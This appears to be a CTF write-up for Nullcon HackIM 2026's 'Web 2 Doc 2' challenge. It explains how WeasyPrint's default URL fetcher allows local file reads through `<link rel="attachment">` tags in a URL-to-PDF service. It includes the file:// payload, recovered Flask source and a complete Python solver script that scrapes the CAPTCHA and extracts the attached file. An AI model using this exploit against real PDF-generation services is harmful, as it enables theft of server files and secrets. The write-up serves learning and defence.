@@ -1,0 +1,201 @@
+---
+title: 'Nullcon HackIM CTF Goa 2026 - Web 2 Doc 2'
+description: 'Writeup for Web 2 Doc 2 from Nullcon HackIM CTF 2026. A Web challenge involving WeasyPrint LFI via PDF attachments.'
+date: 2026-02-08
+tags: ['writeup', 'web', 'weasyprint', 'lfi', 'pdf-generation', 'nullcon']
+authors: ['kudaliar']
+draft: false
+---
+
+**Challenge:** Web 2 Doc 2  
+**Category:** Web  
+
+## Overview
+
+Web 2 Doc 2 is a URL-to-PDF converter web application. Users submit a URL, solve a text-based CAPTCHA, and receive a PDF rendering of the target webpage. Under the hood, the application uses **WeasyPrint 68.1** to convert fetched HTML into PDF documents.
+
+The goal is to read the contents of `/flag.txt` on the server.
+
+## Reconnaissance
+
+### Identifying the Stack
+
+Submitting a valid URL (e.g., `https://example.com`) and inspecting the resulting PDF reveals the producer:
+
+```
+Producer: WeasyPrint 68.1
+```
+
+The application is a Flask app running Python 3.11, confirmed via AWS metadata and `/proc/self/cmdline` (later).
+
+### Application Flow
+
+1. User visits `/` and receives a page with a random 6-character alphanumeric CAPTCHA (e.g., `X1QPNX`).
+2. User submits a URL and the CAPTCHA answer to `POST /convert`.
+3. The server validates the CAPTCHA, fetches the URL using `python-requests` (with `allow_redirects=False` and an `X-Fetcher: Internal` header), and passes the HTML to WeasyPrint for PDF conversion.
+4. The generated PDF is returned to the user.
+
+### Source Code (recovered via the exploit itself)
+
+Using the vulnerability described below, the full application source at `/app/app.py` was extracted:
+
+```python
+from flask import Flask, render_template, request, send_file, jsonify, session
+import requests
+from weasyprint import HTML, default_url_fetcher
+import io
+import os
+import ipaddress
+from urllib.parse import urlparse
+import secrets
+import string
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+
+# ...captcha and helper functions...
+
+@app.route('/convert', methods=['POST'])
+def convert():
+    url = request.form.get('url', '').strip()
+    captcha_answer = request.form.get('captcha_answer', '').strip()
+    # ...captcha validation...
+    try:
+        html_content = fetch_url_with_limit(url)
+        pdf_file = SizeLimitedBytesIO()
+        HTML(string=html_content).write_pdf(pdf_file)  # <-- NO custom url_fetcher!
+        pdf_file.seek(0)
+        return send_file(pdf_file, mimetype='application/pdf', ...)
+    except Exception as e:
+        return jsonify({'error': f'Failed to convert to PDF'}), 500
+```
+
+The critical line is:
+
+```python
+HTML(string=html_content).write_pdf(pdf_file)
+```
+
+**No custom `url_fetcher` is provided.** WeasyPrint's default `url_fetcher` is used, which supports `file://`, `data:`, and `http(s)://` protocols without restriction.
+
+## Vulnerability
+
+### CVE-2024-28184 - WeasyPrint Arbitrary File Read via PDF Attachments
+
+WeasyPrint supports the HTML `<link rel="attachment">` tag, which embeds the referenced resource as a file attachment inside the generated PDF. When no custom `url_fetcher` restricts the protocols, an attacker can use `file://` URIs to read arbitrary local files and have them embedded as PDF attachments.
+
+```html
+<link rel="attachment" href="file:///etc/passwd">
+```
+
+When WeasyPrint renders this HTML, it reads `/etc/passwd` from the local filesystem and embeds the contents as a binary attachment in the PDF. The attachment can then be extracted programmatically using a PDF library like `pypdf`.
+
+### Attack Chain
+
+1. Host a malicious HTML page on an attacker-controlled server (e.g., [webhook.site](https://webhook.site)).
+2. The HTML contains a `<link rel="attachment" href="file:///flag.txt">` tag.
+3. Submit the attacker's URL to the converter with a valid CAPTCHA answer.
+4. The server fetches the HTML via `python-requests` (this step doesn't trigger the vulnerability).
+5. WeasyPrint processes the HTML and encounters the `<link rel="attachment">` tag.
+6. WeasyPrint's default `url_fetcher` reads `file:///flag.txt` from the server's filesystem.
+7. The file contents are embedded as an attachment in the output PDF.
+8. Extract the attachment from the returned PDF.
+
+## Exploit
+
+### Step 1: Set Up Attacker-Controlled HTML
+
+Create a [webhook.site](https://webhook.site) token configured to return:
+
+```html
+<html>
+<head>
+    <link rel="attachment" href="file:///flag.txt">
+</head>
+<body>
+    <h1>Web 2 Doc v2</h1>
+</body>
+</html>
+```
+
+### Step 2: Automated Solver Script
+
+```python
+import requests
+import re
+import tempfile
+import os
+
+BASE = "http://52.59.124.14:5003"
+
+def create_webhook(content):
+    """Create a webhook.site token with custom HTML response."""
+    r = requests.post("https://webhook.site/token", json={
+        "default_status": 200,
+        "default_content": content,
+        "default_content_type": "text/html"
+    }, timeout=10)
+    uuid = r.json()['uuid']
+    return f"https://webhook.site/{uuid}"
+
+def solve_captcha_and_convert(url):
+    """Solve the text CAPTCHA and submit the URL for conversion."""
+    s = requests.Session()
+    r = s.get(BASE + "/", timeout=15)
+
+    # Extract the CAPTCHA text from the page
+    match = re.search(r'class="captcha-display">([^<]+)</div>', r.text)
+    captcha = match.group(1).strip()
+
+    # Submit URL with solved CAPTCHA
+    r = s.post(BASE + "/convert", data={
+        "url": url,
+        "captcha_answer": captcha
+    }, timeout=60)
+    return r
+
+def extract_attachments(pdf_bytes):
+    """Extract file attachments from a PDF."""
+    from pypdf import PdfReader
+    with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
+        f.write(pdf_bytes)
+        f.flush()
+        try:
+            reader = PdfReader(f.name)
+            if reader.attachments:
+                for name, data_list in reader.attachments.items():
+                    return name, data_list[0]
+        finally:
+            os.unlink(f.name)
+    return None, None
+
+# Payload HTML
+html = '''<html><head>
+<link rel="attachment" href="file:///flag.txt">
+</head><body><h1>pwned</h1></body></html>'''
+
+webhook_url = create_webhook(html)
+print(f"[*] Webhook: {webhook_url}")
+
+r = solve_captcha_and_convert(webhook_url)
+if r.status_code == 200:
+    name, data = extract_attachments(r.content)
+    if data:
+        print(f"[+] Flag: {data.decode()}")
+    else:
+        print("[-] No attachment found")
+```
+
+### Step 3: Run and Profit
+
+```
+$ python3 solve.py
+[*] Webhook: https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+[+] Flag: ENO{weasy_pr1nt_can_h4v3_f1l3s_1n_PDF_att4chments!}
+```
+
+## Flag
+
+```
+ENO{weasy_pr1nt_can_h4v3_f1l3s_1n_PDF_att4chments!}
+```
